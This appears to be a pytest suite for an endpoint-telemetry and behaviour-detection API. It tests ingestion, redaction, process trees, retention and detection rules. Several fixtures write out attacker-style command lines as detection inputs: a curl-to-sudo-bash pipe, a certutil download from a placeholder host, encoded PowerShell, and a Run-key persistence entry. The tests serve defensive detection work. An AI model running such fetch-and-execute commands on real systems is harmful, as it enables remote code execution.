"""Telemetría avanzada de endpoint, árbol de procesos y detección de comportamiento (6E.3-6E.5)."""

import gzip
import json
from datetime import UTC, datetime, timedelta
from typing import Any
from uuid import uuid4

from fastapi.testclient import TestClient
from sqlalchemy import Engine, select, update
from sqlalchemy.orm import sessionmaker

from app.core.config import get_settings
from app.detection.behavior import cmdline_findings
from app.detection.config import DetectionConfig
from app.detection.engine import DetectionEngine, EngineRun
from app.endpoint.schema import redact_cmdline
from app.endpoint.service import purge_endpoint
from app.models.asset import Asset
from app.models.audit import AuditEvent
from app.models.endpoint import DetectionExclusion, EndpointActivity, ProcessInstance
from app.services.alert_service import AlertThresholds
from tests.conftest import agent_payload, authenticate

API = "/api/v1"
BOOT = "boot-1"


def _run(engine: Engine) -> EngineRun:
    with sessionmaker(bind=engine)() as session:
        thresholds = AlertThresholds.from_settings(get_settings())
        return DetectionEngine(session, DetectionConfig(), thresholds).process_pending()


def _agent(client: TestClient, hostname: str = "PC-ENDPOINT-01") -> tuple[str, str]:
    payload = agent_payload(hostname=hostname, agent_version="0.5.0")
    response = client.post(f"{API}/agents/register", json=payload)
    assert response.status_code == 201, response.text
    return str(payload["agent_id"]), response.json()["asset_id"]


def _key() -> str:
    return uuid4().hex


def ev(
    category: str,
    action: str,
    data: dict[str, Any] | None = None,
    *,
    instance_key: str | None = None,
    source: str = "psutil_poll",
    at: datetime | None = None,
    uid: str | None = None,
) -> dict[str, Any]:
    return {
        "event_uid": uid or str(uuid4()),
        "seq": 1,
        "category": category,
        "action": action,
        "occurred_at": (at or datetime.now(UTC)).isoformat(),
        "source": source,
        "instance_key": instance_key,
        "data": data or {},
    }


def start(
    key: str,
    name: str,
    *,
    parent: str | None = None,
    relation: str | None = "observed",
    exe: str | None = None,
    cmdline: str | None = None,
    pid: int = 100,
) -> dict[str, Any]:
    data: dict[str, Any] = {"pid": pid, "name": name, "exe": exe or f"C:\\Windows\\{name}"}
    if parent:
        data["parent_instance_key"] = parent
        data["parent_relation"] = relation
    if cmdline:
        data["cmdline"] = cmdline
    return ev("process", "start", data, instance_key=key)


def _batch(agent_id: str, events: list[dict[str, Any]], **extra: Any) -> dict[str, Any]:
    return {
        "agent_id": agent_id,
        "batch_id": str(uuid4()),
        "boot_id": BOOT,
        "events": events,
        **extra,
    }


def _send(client: TestClient, agent_id: str, events: list[dict[str, Any]], **extra: Any) -> Any:
    response = client.post(f"{API}/agents/activity", json=_batch(agent_id, events, **extra))
    assert response.status_code == 200, response.text
    return response.json()


def _rules(client: TestClient) -> dict[str, dict[str, Any]]:
    response = client.get(f"{API}/detections", params={"limit": 500})
    assert response.status_code == 200, response.text
    return {d["rule_id"]: d for d in response.json()["items"]}


# --- ingesta ------------------------------------------------------------------------------------


def test_ingest_accepts_valid_events_and_rejects_bad_ones_individually(
    client: TestClient,
) -> None:
    agent_id, _ = _agent(client)
    future = datetime.now(UTC) + timedelta(hours=2)
    body = _send(
        client,
        agent_id,
        [
            start(_key(), "notepad.exe"),
            ev("process", "explode"),
            ev("process", "start", source="kernel_magic"),
            ev("process", "start", at=future),
            ev("process", "start", {"pid": "not-a-number"}),
            {"event_uid": "nope"},
            ev("dns", "query", {"query": "example.org", "unknown_field": "x"}),
        ],
    )
    assert body["accepted"] == 2
    codes = {r["index"]: r["code"] for r in body["rejected"]}
    assert codes == {
        1: "unknown_action",
        2: "unknown_source",
        3: "occurred_in_future",
        4: "invalid_data",
        5: "invalid_event",
    }


def test_unknown_fields_are_dropped_and_resend_counts_as_duplicate(
    client: TestClient, engine: Engine
) -> None:
    agent_id, _ = _agent(client)
    event = ev("dns", "query", {"query": "example.org", "secret_extra": "x"})
    assert _send(client, agent_id, [event])["accepted"] == 1
    again = _send(client, agent_id, [event, event])
    assert again == again | {"accepted": 0, "duplicates": 1}
    with sessionmaker(bind=engine)() as session:
        row = session.scalars(select(EndpointActivity)).one()
        assert row.data == {"query": "example.org"}


def test_gzip_body_is_accepted_and_bomb_is_refused(client: TestClient) -> None:
    agent_id, _ = _agent(client)
    headers = {
        "Authorization": f"Bearer {client.tokens[agent_id]}",  # type: ignore[attr-defined]
        "Content-Type": "application/json",
        "Content-Encoding": "gzip",
    }
    raw = json.dumps(_batch(agent_id, [start(_key(), "a.exe")])).encode()
    ok = client.post(f"{API}/agents/activity", content=gzip.compress(raw), headers=headers)
    assert ok.status_code == 200, ok.text
    assert ok.json()["accepted"] == 1

    bomb = gzip.compress(b" " * (get_settings().max_request_bytes + 10))
    too_big = client.post(f"{API}/agents/activity", content=bomb, headers=headers)
    assert too_big.status_code == 413
    broken = client.post(f"{API}/agents/activity", content=b"not gzip", headers=headers)
    assert broken.status_code == 422


def test_activity_requires_the_agent_token(client: TestClient) -> None:
    agent_id, _ = _agent(client)
    response = client.post(
        f"{API}/agents/activity", json=_batch(agent_id, [start(_key(), "a.exe")]), headers={}
    )
    assert response.status_code == 401


def test_cmdline_is_redacted_by_the_server(client: TestClient, engine: Engine) -> None:
    agent_id, asset_id = _agent(client)
    key = _key()
    secret = "curl -u admin:Hunter2pass https://user:pw@example.org/x --token abcdef123456"
    _send(client, agent_id, [start(key, "curl.exe", cmdline=secret)])
    with sessionmaker(bind=engine)() as session:
        stored = session.scalars(select(ProcessInstance.cmdline)).one()
    assert stored is not None
    assert "Hunter2pass" not in stored
    assert "user:pw" not in stored
    assert "abcdef123456" not in stored
    detail = client.get(f"{API}/assets/{asset_id}/process-instances/{key}").json()
    assert detail["process"]["cmdline"] == stored


def test_redaction_policies() -> None:
    assert redact_cmdline("a b", "off") is None
    assert redact_cmdline("x" * 9000, "full") == "x" * 8192
    blob = "powershell -enc " + "QUJD" * 40
    redacted = redact_cmdline(blob, "redacted")
    assert redacted is not None
    assert "[BASE64:" in redacted
    header = redact_cmdline("curl -H 'Authorization: Bearer eyJabc.defghi'", "redacted")
    assert header is not None
    assert "eyJabc" not in header
    assert redact_cmdline("curl -u ana:s3cret https://x", "redacted") == (
        "curl -u ana:[REDACTED] https://x"
    )
    assert len(redact_cmdline("y" * 5000, "redacted") or "") <= 2048


def test_rate_limit_returns_429(client: TestClient) -> None:
    agent_id, _ = _agent(client)
    limiter = client.app.state.activity_limiter  # type: ignore[attr-defined]
    original = limiter.acquire
    limiter.acquire = lambda key: 30.0
    try:
        response = client.post(
            f"{API}/agents/activity", json=_batch(agent_id, [start(_key(), "a.exe")])
        )
    finally:
        limiter.acquire = original
    assert response.status_code == 429
    assert response.headers.get("retry-after")


def test_unauthenticated_batches_do_not_consume_the_agent_quota(client: TestClient) -> None:
    # El cupo se cuenta después de autenticar: sin token no se gasta el del agente real.
    agent_id, _ = _agent(client)
    limiter = client.app.state.activity_limiter  # type: ignore[attr-defined]
    original = limiter.acquire
    keys: list[str] = []

    def acquire(key: str) -> float:
        keys.append(key)
        return 0.0

    limiter.acquire = acquire
    try:
        bad = client.post(
            f"{API}/agents/activity",
            json=_batch(agent_id, [start(_key(), "a.exe")]),
            headers={"Authorization": "Bearer wrong"},
        )
        good = client.post(
            f"{API}/agents/activity", json=_batch(agent_id, [start(_key(), "a.exe")])
        )
    finally:
        limiter.acquire = original
    assert bad.status_code == 401
    assert good.status_code == 200, good.text
    assert keys == [agent_id]


# --- árbol de procesos -------------------------------------------------------------------------


def test_process_tree_is_lazy_and_children_are_counted(client: TestClient) -> None:
    agent_id, asset_id = _agent(client)
    root, child, grandchild, orphan = _key(), _key(), _key(), _key()
    _send(
        client,
        agent_id,
        [
            start(root, "explorer.exe", pid=10),
            start(child, "cmd.exe", parent=root, pid=11),
            start(grandchild, "ping.exe", parent=child, pid=12),
            # Padre no confirmado: no cuelga de nadie, sale como raíz.
            start(orphan, "svc.exe", parent=root, relation="pid_reused", pid=13),
        ],
    )
    tree = client.get(f"{API}/assets/{asset_id}/process-tree").json()
    roots = {n["instance_key"]: n for n in tree["nodes"]}
    assert set(roots) == {root, orphan}
    assert roots[root]["children_count"] == 1
    level = client.get(f"{API}/assets/{asset_id}/process-tree", params={"parent": child}).json()
    assert [n["instance_key"] for n in level["nodes"]] == [grandchild]
    found = client.get(f"{API}/assets/{asset_id}/process-tree", params={"search": "12"}).json()
    assert [n["instance_key"] for n in found["nodes"]] == [grandchild]

    detail = client.get(f"{API}/assets/{asset_id}/process-instances/{grandchild}").json()
    assert [a["instance_key"] for a in detail["ancestors"]] == [child, root]


def test_pid_reuse_keeps_distinct_instances(client: TestClient) -> None:
    agent_id, asset_id = _agent(client)
    first, second = _key(), _key()
    _send(client, agent_id, [start(first, "a.exe", pid=500)])
    _send(client, agent_id, [ev("process", "stop", {"pid": 500}, instance_key=first)])
    _send(client, agent_id, [start(second, "b.exe", pid=500)])
    nodes = client.get(f"{API}/assets/{asset_id}/process-tree").json()["nodes"]
    by_key = {n["instance_key"]: n for n in nodes}
    assert by_key[first]["running"] is False
    assert by_key[second]["running"] is True
    assert by_key[first]["name"] == "a.exe"


def test_processes_from_a_previous_boot_are_not_alive(client: TestClient, engine: Engine) -> None:
    agent_id, asset_id = _agent(client)
    old, new = _key(), _key()
    _send(client, agent_id, [start(old, "old.exe")], stats={"queued": 0})
    client.post(
        f"{API}/agents/activity",
        json={**_batch(agent_id, [start(new, "new.exe")], stats={"queued": 0}), "boot_id": "b2"},
    )
    nodes = client.get(f"{API}/assets/{asset_id}/process-tree").json()["nodes"]
    assert [n["instance_key"] for n in nodes] == [new]
    # Con `at` en el pasado sí aparece el proceso del arranque anterior.
    with sessionmaker(bind=engine)() as session:
        started = session.scalars(
            select(ProcessInstance.started_at).where(ProcessInstance.instance_key == old)
        ).one()
    assert started is not None
    past = client.get(
        f"{API}/assets/{asset_id}/process-tree", params={"at": started.isoformat()}
    ).json()["nodes"]
    assert old in {n["instance_key"] for n in past}


def test_activity_list_status_and_metrics(client: TestClient) -> None:
    agent_id, asset_id = _agent(client)
    key = _key()
    _send(
        client,
        agent_id,
        [
            start(key, "app.exe"),
            ev(
                "network",
                "connect",
                {"remote_address": "8.8.8.8", "remote_port": 443, "protocol": "tcp"},
                instance_key=key,
            ),
            ev("dns", "query", {"query": "example.org"}),
        ],
        stats={"queued": 3, "collectors": {"process": "active", "dns": "unavailable"}},
    )
    page = client.get(f"{API}/assets/{asset_id}/activity", params={"limit": 2}).json()
    assert len(page["items"]) == 2
    assert page["next_before_id"] is not None
    rest = client.get(
        f"{API}/assets/{asset_id}/activity", params={"before_id": page["next_before_id"]}
    ).json()
    assert len(rest["items"]) == 1
    network = client.get(
        f"{API}/assets/{asset_id}/activity", params={"category": "network"}
    ).json()["items"]
    assert [e["data"]["remote_port"] for e in network] == [443]
    detail = client.get(f"{API}/assets/{asset_id}/process-instances/{key}").json()
    assert len(detail["connections"]) == 1

    status = client.get(f"{API}/assets/{asset_id}/telemetry-status").json()
    assert status["enabled"] is True
    assert status["stats"]["collectors"]["dns"] == "unavailable"
    assert status["stats"]["boot_id"] == BOOT
    assert status["events_last_hour"] == 3
    assert status["ingest_lag_p95_seconds"] is not None

    metrics = client.get(f"{API}/endpoint/metrics").json()
    assert metrics["events_last_hour"] == 3
    assert metrics["assets_reporting_last_hour"] == 1


def test_unknown_asset_and_instance_are_404(client: TestClient) -> None:
    _, asset_id = _agent(client)
    assert client.get(f"{API}/assets/{uuid4()}/process-tree").status_code == 404
    assert client.get(f"{API}/assets/{asset_id}/process-instances/{_key()}").status_code == 404


def test_telemetry_permissions(client: TestClient, engine: Engine) -> None:
    _, asset_id = _agent(client)
    authenticate(client, engine, "analyst")
    assert client.get(f"{API}/assets/{asset_id}/process-tree").status_code == 200
    assert client.get(f"{API}/detection-exclusions").status_code == 200
    body = {"rule_id": "BEH-002", "field": "exe", "value": "x", "reason": "test"}
    assert client.post(f"{API}/detection-exclusions", json=body).status_code == 403
    authenticate(client, engine, "viewer")
    assert client.get(f"{API}/assets/{asset_id}/process-tree").status_code == 403
    assert client.get(f"{API}/endpoint/metrics").status_code == 403


def test_retention_keeps_long_running_processes(client: TestClient, engine: Engine) -> None:
    agent_id, _ = _agent(client)
    alive, ended, stale = _key(), _key(), _key()
    _send(client, agent_id, [start(alive, "svc.exe"), start(ended, "a.exe")], stats={})
    _send(client, agent_id, [ev("process", "stop", {}, instance_key=ended)])
    _send(client, agent_id, [start(stale, "old.exe")])
    old = datetime.now(UTC) - timedelta(days=400)
    with sessionmaker(bind=engine)() as session:
        session.execute(update(ProcessInstance).values(last_seen_at=old))
        session.execute(
            update(ProcessInstance)
            .where(ProcessInstance.instance_key == ended)
            .values(ended_at=old)
        )
        session.execute(
            update(ProcessInstance)
            .where(ProcessInstance.instance_key == stale)
            .values(boot_id="previous")
        )
        session.execute(update(EndpointActivity).values(received_at=old))
        counts = purge_endpoint(session, get_settings(), datetime.now(UTC))
        session.commit()
        left = set(session.scalars(select(ProcessInstance.instance_key)))
    assert left == {alive}
    assert counts["process_instances"] == 2
    assert counts["endpoint_activity"] >= 4


# --- detección de comportamiento ---------------------------------------------------------------


def test_cmdline_patterns() -> None:
    assert cmdline_findings("powershell.exe -NoP -enc SQBFAFgA") == ["powershell_encoded"]
    assert "pipe_to_shell" in cmdline_findings("curl -s https://x.example/i.sh | sudo bash")
    assert "certutil_download" in cmdline_findings(
        "certutil.exe -urlcache -split -f http://x.example/a.exe a.exe"
    )
    assert cmdline_findings("powershell.exe -File C:\\scripts\\backup.ps1") == []
    assert cmdline_findings(None) == []


def test_document_app_spawning_a_shell_is_detected(client: TestClient, engine: Engine) -> None:
    agent_id, _ = _agent(client)
    word, shell = _key(), _key()
    _send(client, agent_id, [start(word, "WINWORD.EXE")])
    _send(
        client,
        agent_id,
        [start(shell, "powershell.exe", parent=word, cmdline="powershell -enc SQBFAFgA")],
    )
    run = _run(engine)
    assert run.created >= 1
    rules = _rules(client)
    assert rules["BEH-001"]["severity"] == "high"
    assert "BEH-002" in rules


def test_benign_process_creates_no_signal_and_no_detection(
    client: TestClient, engine: Engine
) -> None:
    agent_id, _ = _agent(client)
    explorer, notepad = _key(), _key()
    _send(client, agent_id, [start(explorer, "explorer.exe")])
    _send(client, agent_id, [start(notepad, "notepad.exe", parent=explorer)])
    _run(engine)
    assert not [r for r in _rules(client) if r.startswith("BEH-")]


def test_unusual_location_with_internet_is_low_confidence(
    client: TestClient, engine: Engine
) -> None:
    agent_id, _ = _agent(client)
    key = _key()
    exe = "C:\\Users\\bob\\AppData\\Local\\Temp\\upd.exe"
    _send(client, agent_id, [start(key, "upd.exe", exe=exe)])
    _send(
        client,
        agent_id,
        [
            ev("network", "connect", {"remote_address": "10.0.0.5"}, instance_key=key),
            ev("network", "connect", {"remote_address": "8.8.8.8"}, instance_key=key),
        ],
    )
    _run(engine)
    detection = _rules(client)["BEH-003"]
    assert detection["confidence"] == "low"


def test_protection_and_firewall_only_fire_on_transition(
    client: TestClient, engine: Engine
) -> None:
    agent_id, _ = _agent(client)
    product = {"product": "Microsoft Defender"}
    # Primer informe ya apagado: es la línea base, no un "desactivado".
    _send(client, agent_id, [ev("protection", "state", {**product, "realtime_enabled": False})])
    _send(client, agent_id, [ev("firewall", "state", {"profile": "public", "enabled": True})])
    _run(engine)
    assert not [r for r in _rules(client) if r.startswith("BEH-")]

    _send(client, agent_id, [ev("protection", "state", {**product, "realtime_enabled": True})])
    _send(client, agent_id, [ev("protection", "state", {**product, "realtime_enabled": False})])
    _send(client, agent_id, [ev("firewall", "state", {"profile": "public", "enabled": False})])
    _run(engine)
    rules = _rules(client)
    assert rules["BEH-005"]["severity"] == "high"
    assert rules["BEH-006"]["severity"] == "medium"


def test_persistence_detection(client: TestClient, engine: Engine) -> None:
    agent_id, _ = _agent(client)
    _send(
        client,
        agent_id,
        [
            ev(
                "persistence",
                "created",
                {
                    "mechanism": "run_key",
                    "name": "Updater",
                    "location": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "target": "C:\\Users\\Public\\upd.exe",
                },
                source="persistence_poll",
            ),
            ev("persistence", "deleted", {"mechanism": "cron", "name": "x"}),
        ],
    )
    _run(engine)
    detection = _rules(client)["BEH-004"]
    assert detection["severity"] == "high"


def test_exclusion_suppresses_and_counts_hits(client: TestClient, engine: Engine) -> None:
    agent_id, asset_id = _agent(client)
    body = {
        "rule_id": "BEH-002",
        "field": "exe",
        "value": "C:\\Tools\\Deploy\\PowerShell.exe",
        "reason": "Script de despliegue firmado",
        "asset_id": asset_id,
    }
    created = client.post(f"{API}/detection-exclusions", json=body)
    assert created.status_code == 201, created.text
    exclusion = created.json()
    assert exclusion["value"] == body["value"].lower()
    assert exclusion["active"] is True
    _send(
        client,
        agent_id,
        [
            start(
                _key(),
                "powershell.exe",
                exe="C:\\Tools\\Deploy\\powershell.exe",
                cmdline="powershell -enc SQBFAFgA",
            )
        ],
    )
    _run(engine)
    assert "BEH-002" not in _rules(client)
    with sessionmaker(bind=engine)() as session:
        row = session.scalars(select(DetectionExclusion)).one()
        assert row.hits == 1
        audit = session.scalars(
            select(AuditEvent.action).where(AuditEvent.action.like("detection_exclusion%"))
        ).all()
    assert audit == ["detection_exclusion_created"]

    revoked = client.post(f"{API}/detection-exclusions/{exclusion['id']}/revoke")
    assert revoked.status_code == 200
    assert revoked.json()["active"] is False
    assert client.get(f"{API}/detection-exclusions").json()["items"] == []
    listed = client.get(f"{API}/detection-exclusions", params={"include_inactive": True})
    assert len(listed.json()["items"]) == 1

    _send(
        client,
        agent_id,
        [
            start(
                _key(),
                "powershell.exe",
                exe="C:\\Tools\\Deploy\\powershell.exe",
                cmdline="powershell -enc SQBFAFgA",
            )
        ],
    )
    _run(engine)
    assert "BEH-002" in _rules(client)


def test_exclusion_rejects_unknown_rules(client: TestClient) -> None:
    body = {"rule_id": "NOPE-1", "field": "exe", "value": "x", "reason": "test"}
    response = client.post(f"{API}/detection-exclusions", json=body)
    assert response.status_code == 422
    assert response.json()["error"]["code"] == "exclusion_rule_unknown"


def test_signals_are_bounded_and_detection_latency_is_measured(
    client: TestClient, engine: Engine
) -> None:
    agent_id, _ = _agent(client)
    _send(
        client,
        agent_id,
        [start(_key(), "cmd.exe", cmdline=f"powershell -enc AAAA{i}") for i in range(3)],
    )
    _run(engine)
    metrics = client.get(f"{API}/endpoint/metrics").json()
    assert metrics["behavior_detections_24h"] >= 1
    assert metrics["detection_latency_p95_seconds"] is not None


def test_ingest_updates_last_contact(client: TestClient, engine: Engine) -> None:
    agent_id, asset_id = _agent(client)
    with sessionmaker(bind=engine)() as session:
        session.execute(update(Asset).values(last_seen_at=datetime.now(UTC) - timedelta(days=1)))
        session.commit()
    _send(client, agent_id, [ev("dns", "query", {"query": "example.org"})])
    with sessionmaker(bind=engine)() as session:
        seen = session.scalars(select(Asset.last_seen_at)).one()
    assert seen is not None
    assert datetime.now(UTC) - seen < timedelta(minutes=1)
    assert asset_id
